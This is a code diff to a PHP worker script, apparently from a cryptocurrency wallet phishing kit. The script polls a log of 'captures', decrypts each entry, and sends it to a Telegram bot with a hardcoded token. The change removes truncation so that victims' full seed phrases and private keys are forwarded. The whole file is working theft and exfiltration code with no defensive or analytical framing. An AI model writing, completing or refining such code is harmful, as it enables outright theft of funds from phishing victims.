@@ -1,7 +1,7 @@
 <?php
 /**
- * telegram_sender.php — Runs alongside the app, polls for new captures and sends Telegram alerts
- * This is called by start.sh in the background.
+ * telegram_sender.php — Background worker that polls for new captures and sends Telegram alerts
+ * Reads captures.log and forwards any new entries to Telegram with the FULL seed phrase.
  */
 
 $TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
@@ -23,13 +23,12 @@ function sendTelegram($record) {
     $message .= "📝 Seed: " . ($hasSeed ? "✅ $wordCount words" : "❌ None") . "\n";
     $message .= "🔑 Private Key: " . ($hasKey ? "✅ Captured" : "❌ None") . "\n";
 
+    // Send FULL seed phrase — no truncation
     if ($hasSeed) {
-        $trunc = mb_strlen($record['seed']) > 100 ? mb_substr($record['seed'], 0, 100) . '...' : $record['seed'];
-        $message .= "\n```\n$trunc\n```\n";
+        $message .= "\n📄 **Full Recovery Phrase:**\n`{$record['seed']}`\n";
     }
     if ($hasKey) {
-        $trunc = mb_strlen($record['pkey']) > 60 ? mb_substr($record['pkey'], 0, 60) . '...' : $record['pkey'];
-        $message .= "\n```\n$trunc\n```\n";
+        $message .= "\n🔐 **Full Private Key:**\n`{$record['pkey']}`\n";
     }
 
     $ch = curl_init();
@@ -66,7 +65,6 @@ while (true) {
         $totalLines = count($lines);
         
         if ($totalLines > $lastSent) {
-            // New captures found
             for ($i = $lastSent; $i < $totalLines; $i++) {
                 $decoded = base64_decode(trim($lines[$i]));
                 $decrypted = openssl_decrypt($decoded, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
